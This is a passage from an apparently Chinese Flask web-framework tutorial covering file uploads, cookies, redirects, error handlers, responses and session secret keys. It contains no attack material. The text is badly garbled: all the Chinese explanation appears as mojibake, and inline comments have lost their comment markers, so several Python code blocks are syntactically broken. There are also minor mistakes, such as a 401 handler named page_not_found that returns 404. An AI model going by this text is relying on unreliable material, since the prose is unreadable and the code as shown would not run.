class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> werkzeug <span class="keyword">import</span> secure_filename</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/upload'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def upload_file():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        f = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">        f.save(<span class="string">'/var/www/uploads/'</span> + secure_filename(f.filename))</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h1 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h1><p>ä½ å¯ä»¥ç”¨ cookies å±æ€§æ¥è®¿é—® Cookies ã€‚ä½ èƒ½å¤Ÿç”¨å“åº”å¯¹è±¡çš„ set_cookie æ¥è®¾ç½® cookiesã€‚è¯·æ±‚å¯¹è±¡ä¸­çš„ cookies å±æ€§æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯å‘é€æ‰€æœ‰çš„ cookies çš„å­—å…¸ã€‚</p><p>å¦‚æœä½ è¦ä½¿ç”¨ä¼šè¯(sessions)ï¼Œè¯·ä¸è¦ç›´æ¥ä½¿ç”¨ cookiesï¼Œç›¸åï¼Œè¯·ç”¨ Flask ä¸­çš„ä¼šè¯ï¼ŒFlask å·²ç»åœ¨cookies ä¸Šå¢åŠ äº†ä¸€äº›å®‰å…¨ç»†èŠ‚ï¼›å…³äºæ›´å¤š seesions å’Œ cookies çš„åŒºåˆ«ä¸è”ç³»ï¼Œè¯·å‚è§æ–½æ¨å‡ºå“çš„åšå®¢ã€‚</p><p>è¯»å– cookies:<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    username = request.cookies.<span class="built_in">get</span>(<span class="string">'username'</span>)</span><br><span class="line">     æ³¨æ„è¿™é‡Œå¼•ç”¨cookieså­—å…¸çš„é”®å€¼å¯¹æ˜¯ä½¿ç”¨cookies.<span class="built_in">get</span>(<span class="built_in">key</span>)</span><br><span class="line">     è€Œä¸æ˜¯cookies[<span class="built_in">key</span>]ï¼Œè¿™æ˜¯é˜²æ­¢è¯¥å­—å…¸ä¸å­˜åœ¨æ—¶æŠ¥é”™<span class="string">"keyerror"</span></span><br></pre></td></tr></table></figure></p><p>å­˜å‚¨ cookies:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> make_response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(render_template(...))</span><br><span class="line">    resp.set_cookie(<span class="string">'username'</span>, <span class="string">'the username'</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></p><p>æ³¨æ„cookiesæ˜¯åœ¨å“åº”å¯¹è±¡ä¸­è¢«è®¾ç½®ã€‚ç”±äºé€šå¸¸åªæ˜¯ä»è§†å›¾å‡½æ•°è¿”å›å­—ç¬¦ä¸²ï¼ŒFlask ä¼šå°†å…¶è½¬æ¢ä¸ºå“åº”å¯¹è±¡ã€‚å¦‚æœä½ è¦æ˜¾å¼åœ°è¿™ä¹ˆåšï¼Œå¯ä»¥ä½¿ç”¨ make_response() å‡½æ•°æ¥ç€ä¿®æ”¹å®ƒã€‚</p><p>æœ‰æ—¶å€™ä½ å¯èƒ½è¦åœ¨å“åº”å¯¹è±¡ä¸å­˜åœ¨çš„åœ°æ–¹è®¾ç½®cookieã€‚åˆ©ç”¨å»¶è¿Ÿè¯·æ±‚å›è°ƒæ¨¡å¼ä½¿å¾—è¿™ç§æƒ…å†µæˆä¸ºå¯èƒ½ã€‚</p><p>æœ¬èŠ‚è®²è§£äº† flask çš„è¯·æ±‚ï¼Œå¦‚æœæƒ³åœ¨æ²¡æœ‰è¯·æ±‚çš„æƒ…å†µä¸‹è·å–ä¸Šä¸‹æ–‡ï¼Œå¯ä»¥ä½¿ç”¨test_request_context()æˆ–è€…request_context()ï¼Œä»requestå¯¹è±¡çš„formä¸­å¯ä»¥è·å–è¡¨å•çš„æ•°æ®ï¼Œargsä¸­å¯ä»¥è·å– URL ä¸­çš„å‚æ•°ï¼Œfileså¯ä»¥è·å–ä¸Šä¼ çš„æ–‡ä»¶ï¼Œcookieså¯ä»¥æ“ä½œcookieã€‚</p><h2 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><p>è¯·å®ç°ä¸€ä¸ªä¸Šä¼ å›¾ç‰‡åˆ°æœåŠ¡å™¨çš„åŠŸèƒ½ã€‚å…·ä½“è¦æ±‚å¦‚ä¸‹ï¼š</p><p>åœ¨ /home/shiyanlou/Code ç›®å½•ä¸‹æ–°å»º upload_file.py æ–‡ä»¶å¹¶åœ¨å…¶ä¸­å†™å…¥æœ¬ç»ƒä¹ çš„ä»£ç ã€‚<br>è¦æ±‚ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜ä½ç½®ä¸º /home/shiyanlou/Code ç›®å½•ä¸‹ã€‚<br>å½“è®¿é—®é¦–é¡µ <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a> æ—¶å‡ºç°è¡¨å•å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œ<br>å½“ä¸Šä¼ æˆåŠŸååœ¨æµè§ˆå™¨å¯ä»¥çœ‹åˆ° &lt;ä¸Šä¼ çš„æ–‡ä»¶å&gt; upload successed!</p><p>å‚è€ƒä»£ç <br>åœ¨ /home/shiyanlou/Code/upload_file.py æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> werkzeug <span class="keyword">import</span> secure_filename    è·å–ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å</span><br><span class="line"></span><br><span class="line">UPLOAD_FOLDER = <span class="string">'/home/shiyanlou/Code'</span>    ä¸Šä¼ è·¯å¾„</span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'txt'</span>, <span class="string">'pdf'</span>, <span class="string">'png'</span>, <span class="string">'jpg'</span>, <span class="string">'jpeg'</span>, <span class="string">'gif'</span>])    å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = UPLOAD_FOLDER</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span>    éªŒè¯ä¸Šä¼ çš„æ–‡ä»¶åæ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œæ–‡ä»¶åå¿…é¡»å¸¦ç‚¹å¹¶ä¸”ç¬¦åˆå…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹è¦æ±‚ï¼Œä¸¤è€…éƒ½æ»¡è¶³åˆ™è¿”å› true</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>] <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:    å¦‚æœæ˜¯ POST è¯·æ±‚æ–¹å¼</span><br><span class="line">        file = request.files[<span class="string">'file'</span>]    è·å–ä¸Šä¼ çš„æ–‡ä»¶</span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):    å¦‚æœæ–‡ä»¶å­˜åœ¨å¹¶ä¸”ç¬¦åˆè¦æ±‚åˆ™ä¸º true</span><br><span class="line">            filename = secure_filename(file.filename)    è·å–ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename))    ä¿å­˜æ–‡ä»¶</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'&amp;#123;&amp;#125; upload successed!'</span>.format(filename)    è¿”å›ä¿å­˜æˆåŠŸçš„ä¿¡æ¯</span><br><span class="line">     ä½¿ç”¨ GET æ–¹å¼è¯·æ±‚é¡µé¢æ—¶æˆ–æ˜¯ä¸Šä¼ æ–‡ä»¶å¤±è´¥æ—¶è¿”å›ä¸Šä¼ æ–‡ä»¶çš„è¡¨å•é¡µé¢</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''</span></span><br><span class="line"><span class="string">    &lt;!doctype html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Upload new File&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Upload new File&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="" method=post enctype=multipart/form-data&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;&lt;input type=file name=file&gt;</span></span><br><span class="line"><span class="string">         &lt;input type=submit value=Upload&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    '''</span></span><br></pre></td></tr></table></figure></p><h1 id="é‡å®šå‘ã€å“åº”ã€ä¼šè¯å’Œæ‰©å±•"><a href="#é‡å®šå‘ã€å“åº”ã€ä¼šè¯å’Œæ‰©å±•" class="headerlink" title="é‡å®šå‘ã€å“åº”ã€ä¼šè¯å’Œæ‰©å±•"></a>é‡å®šå‘ã€å“åº”ã€ä¼šè¯å’Œæ‰©å±•</h1><h2 id="é‡å®šå‘å’Œé”™è¯¯"><a href="#é‡å®šå‘å’Œé”™è¯¯" class="headerlink" title="é‡å®šå‘å’Œé”™è¯¯"></a>é‡å®šå‘å’Œé”™è¯¯</h2><p>ä½ èƒ½å¤Ÿç”¨redirect()å‡½æ•°é‡å®šå‘ç”¨æˆ·åˆ°å…¶å®ƒåœ°æ–¹ã€‚èƒ½å¤Ÿç”¨abort()å‡½æ•°æå‰ä¸­æ–­ä¸€ä¸ªè¯·æ±‚å¹¶å¸¦æœ‰ä¸€ä¸ªé”™è¯¯ä»£ç ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ¼”ç¤ºå®ƒä»¬å¦‚ä½•å·¥ä½œçš„ä¾‹å­ï¼Œåœ¨ /home/shiyanlou/Code/ ç›®å½•ä¸‹æ–°å»º hello.py æ–‡ä»¶å¹¶å‘å…¶ä¸­å†™å…¥å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> abort, redirect, url_for</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    abort(<span class="number">401</span>)</span><br><span class="line">    this_is_never_executed()</span><br></pre></td></tr></table></figure></p><p>æŒ‰ç…§ä¹‹å‰çš„æ–¹å¼è¿è¡Œåº”ç”¨ï¼Œè¿™æ˜¯ä¸€ä¸ªç›¸å½“æ— æ„ä¹‰çš„ä¾‹å­å› ä¸ºç”¨æˆ·ä¼šä»ä¸»é¡µ/é‡å®šå‘åˆ°ä¸€ä¸ªä¸èƒ½è®¿é—®çš„é¡µé¢/loginï¼ˆ 401 æ„å‘³ç€ç¦æ­¢è®¿é—®ï¼‰ï¼Œä½†æ˜¯å®ƒè¯´æ˜äº†é‡å®šå‘å¦‚ä½•å·¥ä½œã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæ¯ä¸ªé”™è¯¯ä»£ç ä¼šæ˜¾ç¤ºä¸€ä¸ªé»‘ç™½é”™è¯¯é¡µé¢ã€‚æ¯”å¦‚ä¸Šé¢çš„é¡µé¢ä¼šæ˜¾ç¤º 401 Unauthorizedã€‚<br>å¦‚æœä½ æƒ³å®šåˆ¶é”™è¯¯é¡µé¢ï¼Œå¯ä»¥ä½¿ç”¨errorhandler()è£…é¥°å™¨ï¼Œå‘ /home/shiyanlou/Code/hello.py æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç :<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(401)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'page_not_found.html'</span>), <span class="number">404</span></span><br></pre></td></tr></table></figure></p><p>æ³¨æ„åˆ° 404 æ˜¯åœ¨render_template()è°ƒç”¨ä¹‹åã€‚å‘Šè¯‰ Flask è¯¥é¡µçš„é”™è¯¯ä»£ç åº”æ˜¯ 404 ï¼Œå³æ²¡æœ‰æ‰¾åˆ°ã€‚é»˜è®¤çš„ 200 è¢«å‡å®šä¸ºï¼šä¸€åˆ‡æ­£å¸¸ã€‚</p><p>åœ¨ /home/shiyanlou/Code ç›®å½•ä¸‹æ–°å»º templates æ–‡ä»¶å¤¹ï¼Œå¹¶åœ¨å…¶ä¸­æ–°å»º page_not_found.html æ–‡ä»¶ã€‚<br>å‘ page_not_found.html æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;<span class="built_in">page</span> <span class="built_in">not</span> found, this <span class="keyword">is</span> an error <span class="built_in">page</span>.&lt;/h1&gt;</span><br></pre></td></tr></table></figure></p><h2 id="å“åº”"><a href="#å“åº”" class="headerlink" title="å“åº”"></a>å“åº”</h2><p>ä¸€ä¸ªè§†å›¾å‡½æ•°çš„è¿”å›å€¼ä¼šè¢«è‡ªåŠ¨è½¬æ¢ä¸ºä¸€ä¸ªå“åº”å¯¹è±¡ã€‚å¦‚æœè¿”å›å€¼æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒè¢«è½¬æ¢æˆä¸€ä¸ªå“åº”ä¸»ä½“æ˜¯è¯¥å­—ç¬¦ä¸²ï¼Œé”™è¯¯ä»£ç ä¸º 200 OK ï¼Œåª’ä½“ç±»å‹ä¸ºtext/htmlçš„å“åº”å¯¹è±¡ã€‚Flask æŠŠè¿”å›å€¼è½¬æ¢æˆå“åº”å¯¹è±¡çš„é€»è¾‘å¦‚ä¸‹ï¼š</p><p>å¦‚æœè¿”å›çš„æ˜¯ä¸€ä¸ªåˆæ³•çš„å“åº”å¯¹è±¡ï¼Œå®ƒä¼šç›´æ¥ä»è§†å›¾è¿”å›ã€‚<br>å¦‚æœè¿”å›çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå“åº”å¯¹è±¡ä¼šç”¨å­—ç¬¦ä¸²æ•°æ®å’Œé»˜è®¤å‚æ•°åˆ›å»ºã€‚<br>å¦‚æœè¿”å›çš„æ˜¯ä¸€ä¸ªå…ƒç»„è€Œä¸”å…ƒç»„ä¸­å…ƒç´ èƒ½å¤Ÿæä¾›é¢å¤–çš„ä¿¡æ¯ã€‚è¿™æ ·çš„å…ƒç»„å¿…é¡»æ˜¯(response, status, headers) å½¢å¼ä¸”è‡³å°‘å«æœ‰å…¶ä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚statuså€¼å°†ä¼šè¦†ç›–çŠ¶æ€ä»£ç ï¼Œheaderså¯ä»¥æ˜¯ä¸€ä¸ªåˆ—è¡¨æˆ–é¢å¤–çš„æ¶ˆæ¯å¤´å€¼å­—å…¸ã€‚<br>å¦‚æœä¸Šè¿°æ¡ä»¶å‡ä¸æ»¡è¶³ï¼ŒFlask ä¼šå‡è®¾è¿”å›å€¼æ˜¯ä¸€ä¸ªåˆæ³•çš„ WSGI åº”ç”¨ç¨‹åºï¼Œå¹¶è½¬æ¢ä¸ºä¸€ä¸ªè¯·æ±‚å¯¹è±¡ã€‚<br>å¦‚æœä½ æƒ³è¦è·å–åœ¨è§†å›¾ä¸­å¾—åˆ°çš„å“åº”å¯¹è±¡ï¼Œä½ å¯ä»¥ç”¨å‡½æ•°make_response()ã€‚</p><p>æƒ³è±¡ä½ æœ‰è¿™æ ·ä¸€ä¸ªè§†å›¾:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(<span class="number">404</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_found</span><span class="params">(error)</span></span><span class="symbol">:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'error.html'</span>), <span class="number">404</span></span><br></pre></td></tr></table></figure></p><p>ä½ åªéœ€è¦ç”¨make_response()å°è£…è¿”å›è¡¨è¾¾å¼ï¼Œè·å–ç»“æœå¯¹è±¡å¹¶ä¿®æ”¹ï¼Œç„¶åè¿”å›å®ƒï¼š<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(<span class="number">404</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">not_found</span><span class="params">(error)</span></span><span class="symbol">:</span></span><br><span class="line">    resp = make_response(render_template(<span class="string">'error.html'</span>), <span class="number">404</span>)</span><br><span class="line">    resp.headers[<span class="string">'X-Something'</span>] = <span class="string">'A value'</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></p><h2 id="ä¼šè¯"><a href="#ä¼šè¯" class="headerlink" title="ä¼šè¯"></a>ä¼šè¯</h2><p>é™¤äº†è¯·æ±‚å¯¹è±¡ï¼Œè¿˜æœ‰ç¬¬äºŒä¸ªç§°ä¸ºsessionå¯¹è±¡å…è®¸ä½ åœ¨ä¸åŒè¯·æ±‚é—´å­˜å‚¨ç‰¹å®šç”¨æˆ·çš„ä¿¡æ¯ã€‚è¿™æ˜¯åœ¨ cookies çš„åŸºç¡€ä¸Šå®ç°çš„ï¼Œå¹¶ä¸”åœ¨ cookies ä¸­ä½¿ç”¨åŠ å¯†çš„ç­¾åã€‚è¿™æ„å‘³ç€ç”¨æˆ·å¯ä»¥æŸ¥çœ‹ cookie çš„å†…å®¹ï¼Œä½†æ˜¯ä¸èƒ½ä¿®æ”¹å®ƒï¼Œé™¤éçŸ¥é“ç­¾åçš„å¯†é’¥ã€‚</p><p>è¦ä½¿ç”¨ä¼šè¯ï¼Œä½ éœ€è¦è®¾ç½®ä¸€ä¸ªå¯†é’¥ã€‚è¿™é‡Œä»‹ç»ä¼šè¯å¦‚ä½•å·¥ä½œï¼Œåœ¨ /home/shiyanlou/Code ç›®å½•ä¸‹æ–°å»º test.py æ–‡ä»¶å¹¶å†™å…¥å¦‚ä¸‹ä»£ç ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for, escape, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"> è®¾ç½®å¯†é’¥ï¼Œä¿è¯ä¼šè¯å®‰å…¨</span><br><span class="line">app.secret_key = <span class="string">'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Logged in as %s'</span> % escape(session[<span class="string">'username'</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You are not logged in'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        session[<span class="string">'username'</span>] = request.form[<span class="string">'username'</span>]</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''</span></span><br><span class="line"><span class="string">        &lt;form method="post"&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;&lt;input type=text name=username&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;&lt;input type=submit value=Login&gt;</span></span><br><span class="line"><span class="string">        &lt;/form&gt;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">     å¦‚æœç”¨æˆ·åå­˜åœ¨ï¼Œåˆ™ä»ä¼šè¯ä¸­ç§»é™¤è¯¥ç”¨æˆ·å</span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="keyword">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br></pre></td></tr></table></figure></p><p>è¿™é‡Œæåˆ°çš„escape()å¯ä»¥åœ¨ä½ ä¸ä½¿ç”¨æ¨¡æ¿å¼•æ“çš„æ—¶å€™åšè½¬ä¹‰ï¼ˆå¦‚åŒæœ¬ä¾‹ï¼‰ã€‚å…¶ä¸­ï¼Œloginå‡½æ•°ä¸­è¿”å›çš„ç½‘é¡µæºä»£ç å¯ä»¥å•ç‹¬å­˜å‚¨åœ¨templatesæ–‡ä»¶å¤¹ä¸­ä½œä¸ºæ¨¡æ¿æ–‡ä»¶htmlï¼Œç„¶åä½¿ç”¨return render_template()æ›´æ–¹ä¾¿ã€‚</p><p>æŒ‰ç…§å‰é¢çš„æ–¹å¼è¿è¡Œç¨‹åºï¼š</p><p>å½“è®¿é—®é¦–é¡µ <a href="http://127.0.0.1:5000/" target="_blank" rel="noopener">http://127.0.0.1:5000/</a> æ—¶ä¼šæ˜¾ç¤º You are not logged inï¼›</p><p>å½“è®¿é—®ç™»å½•é¡µé¢ <a href="http://127.0.0.1:5000/login" target="_blank" rel="noopener">http://127.0.0.1:5000/login</a> æ—¶ä¼šå‡ºç°ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œåœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ç”¨æˆ·å shiyanlouï¼Œç„¶åç‚¹å‡» Login æŒ‰é’®ï¼Œè¿™æ—¶ URL ä¼šé‡å®šå‘åˆ°é¦–é¡µä¸Šï¼Œé¦–é¡µæ˜¾ç¤º Logged in as shiyanlouï¼›</p><p>æœ€åå†è®¿é—®ç™»å‡ºé¡µé¢ <a href="http://127.0.0.1:5000/logoutï¼Œè¿™æ—¶ä»" target="_blank" rel="noopener">http://127.0.0.1:5000/logoutï¼Œè¿™æ—¶ä»</a> session ä¸­ç§»é™¤äº†ç”¨æˆ·åï¼ŒURL é‡å®šå‘åˆ°é¦–é¡µæ˜¾ç¤º You are not logged inï¼›</p><p>æ€æ ·äº§ç”Ÿä¸€ä¸ªå¥½çš„å¯†é’¥ï¼š</p><p>éšæœºçš„é—®é¢˜åœ¨äºå¾ˆéš¾åˆ¤æ–­ä»€ä¹ˆæ˜¯çœŸéšæœºã€‚ä¸€ä¸ªå¯†é’¥åº”è¯¥è¶³å¤Ÿéšæœºã€‚ä½ çš„æ“ä½œç³»ç»Ÿå¯ä»¥åŸºäºä¸€ä¸ªå¯†ç éšæœºç”Ÿæˆå™¨æ¥ç”Ÿæˆæ¼‚äº®çš„éšæœºå€¼ï¼Œè¿™ä¸ªå€¼å¯ä»¥ç”¨æ¥åšå¯†é’¥:<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3 -c 'import os; print(os.urandom(16))'</span><br><span class="line">b'm <span class="symbol">\x</span>f8&gt;]?<span class="symbol">\x</span>86<span class="symbol">\x</span>cf/y<span class="symbol">\x</span>0e<span class="symbol">\x</span>c5<span class="symbol">\x</span>c7j<span class="symbol">\x</span>c5/'</span><br></pre></td></tr></table></figure></p><p>æŠŠè¿™ä¸ªå€¼å¤åˆ¶ç²˜è´´åˆ°ä½ çš„ä»£ç ï¼Œä½ å°±æå®šäº†å¯†é’¥ã€‚</p><p>ä½¿ç”¨åŸºäº cookie çš„ä¼šè¯éœ€æ³¨æ„: Flask ä¼šå°†ä½ æ”¾è¿›ä¼šè¯ï¼ˆsessionï¼‰å¯¹è±¡çš„å€¼åºåˆ—åŒ–åˆ° cookie ã€‚å¦‚æœä½ è¯•å›¾å¯»æ‰¾ä¸€ä¸ªè·¨è¯·æ±‚ä¸èƒ½å­˜ç•™çš„å€¼ï¼Œcookies ç¡®å®æ˜¯å¯ç”¨çš„ï¼Œå¹¶ä¸”ä½ ä¸ä¼šè·å¾—æ˜ç¡®çš„é”™è¯¯ä¿¡æ¯ï¼Œæ£€æŸ¥ä½ é¡µé¢è¯·æ±‚ä¸­ cookie çš„å¤§å°ï¼Œå¹¶ä¸ web æµè§ˆå™¨æ‰€æ”¯æŒçš„å¤§å°å¯¹æ¯”ã€‚</p><h2 id="æ¶ˆæ¯"><a href="#æ¶ˆæ¯" class="headerlink" title="æ¶ˆæ¯"></a>æ¶ˆæ¯</h2><p>å¥½çš„åº”ç”¨å’Œç”¨æˆ·ç•Œé¢å…¨éƒ¨æ˜¯å…³äºåé¦ˆã€‚å¦‚æœç”¨æˆ·å¾—ä¸åˆ°è¶³å¤Ÿçš„åé¦ˆï¼Œä»–ä»¬å¯èƒ½ä¼šå˜å¾—è®¨åŒè¿™ä¸ªåº”ç”¨ã€‚Flask 